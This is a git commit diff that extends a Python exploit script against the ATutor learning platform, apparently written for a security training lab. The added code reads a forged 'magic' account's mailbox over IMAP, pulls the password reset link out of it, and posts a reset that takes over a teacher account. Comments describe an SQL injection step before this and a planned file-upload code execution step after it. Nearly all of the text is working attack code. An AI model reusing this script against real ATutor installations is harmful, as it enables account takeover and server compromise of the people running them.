691e75b0585f485ba24a89bbbc3d4e62aa48cd92
zinhart <aromzinhartdegraca@gmail.com>
2022-09-28 12:41:14 -0700

    Type juggling exploit 6/7 steps done(reset teach pass successful). All that is left is file upload.

--- atutor/type-juggling-auth-bypass/atutor-rce.py
+++ atutor/type-juggling-auth-bypass/atutor-rce.py
@@ -1,10 +1,14 @@
 import sys
+import urllib.parse
 sys.path.append('..')
-import os
+import re
 
 import asyncio
 from lib.mysqli_template_async import get_string
 from lib.mysqli_template_async import get_length
+
+from lib.read_email import get_imap
+from lib.read_email import get_messages
 
 import hashlib, string, itertools, re, sys, requests
 import netifaces as ni
@@ -28,6 +32,8 @@ def gen_magic_email(domain, id, date, prefix_length):
             return F"{word}@{domain}"
         count += 1
     return ''
+def parse_msg_links(msg_links):
+    pass
 
 async def main():
     # 1. use sqli to exfil teacher account creation date
@@ -61,9 +67,44 @@ async def main():
         ("(-) Error Triggering password reset")
         exit(1)
     # 5. get reset link from atmail email
+    pw_reset_url='http://atutor/ATutor/password_reminder.php'
+    pw_reset_params = {"form_password_reminder": "true", "form_email": magic_email, "submit": "Submit"}
+    imap_client = get_imap("atmail")
+    imap_client.login(magic_email, '123456')
+    msgs = get_messages(imap_client,'inbox')
+    links_expr = r"(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'\".,<>?«»“”‘’]))"
+    pw_reset_link = ''
+    reset_link_found = False
+    for msg in msgs:
+        if reset_link_found == True:
+            break
+        msg_links = re.findall(links_expr, msg['body'])
+        for link in msg_links:
+            if 'http://atutor/ATutor/password_reminder.php' in link[0]:
+                pw_reset_link = link[0]
+                reset_link_found = True
+                break
+    print(F"(+) Got pwd reset link: {pw_reset_link}")
     # 6. change password
     #pw_reset_url='http://atutor/Atutor/password_reminder.php'
-    #pw_change_params = {"form_change": "true", "id": "1", "g": "19262", "h": "238e5f23be70c47", "form_password_hidden": "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e", "password_error": '', "password": '', "password2": '', "submit": "Submit"}
+    params = pw_reset_link.split('?')[1]
+    #print(params)
+    params_dict = urllib.parse.parse_qs(params)
+    #print(params_dict)
+    pw_unhashed = 'donkey123'
+    password =  hashlib.sha1(pw_unhashed.encode('utf-8')).hexdigest()
+    pw_reset_params = {"form_change": "true", "id": F"{params_dict['id'][0]}", "g": F"{params_dict['g'][0]}", "h": F"{params_dict['h'][0]}", "form_password_hidden": F"{password}", "password_error": '', "password": '', "password2": '', "submit": "Submit"}
+    #print(pw_reset_params)
+    pw_reset_url='http://atutor/Atutor/password_reminder.php'
+    res = requests.post(pw_reset_link, data=pw_reset_params, allow_redirects=False)
+    #res = requests.post(pw_reset_link, data=pw_reset_params,, allow_redirects=False, proxies={'http':'http://192.168.177.1:8080'})
+    if (res.status_code == 302):
+        print("(+) Password reset success")
+        print(F"(+) Password reset to {pw_unhashed}")
+    else:
+        ("(-) Error resetting password")
+        exit(1)
+    # this is another post request that returns a 302 response.
     # 7. login and reuse file upload vuln
 if __name__ == "__main__":
     try:
